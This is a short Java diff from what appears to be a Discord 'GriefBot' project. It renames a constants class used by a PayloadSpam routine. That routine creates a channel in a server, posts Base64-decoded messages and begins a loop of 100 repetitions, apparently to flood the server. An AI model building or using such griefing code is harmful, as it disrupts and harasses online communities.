@@ -4,7 +4,7 @@ import java.nio.charset.StandardCharsets;
 import java.util.Base64;
 
 import de.corruptedbytes.GriefBot;
-import de.corruptedbytes.utils.Shelv;
+import de.corruptedbytes.utils.Constants;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.TextChannel;
 
@@ -21,9 +21,9 @@ public class PayloadSpam implements Runnable {
 	@Override
 	public void run() {
 		TextChannel base = guild
-				.createTextChannel(new String(Base64.getDecoder().decode(Shelv.ASCII_EMOJI), StandardCharsets.UTF_8))
+				.createTextChannel(new String(Base64.getDecoder().decode(Constants.ASCII_EMOJI), StandardCharsets.UTF_8))
 				.complete();
-		base.sendMessage(new String(Base64.getDecoder().decode(Shelv.ASCII_MEME), StandardCharsets.UTF_8)).queue();
+		base.sendMessage(new String(Base64.getDecoder().decode(Constants.ASCII_MEME), StandardCharsets.UTF_8)).queue();
 
 		for (int i = 0; i < 100; i++) {
 			try {
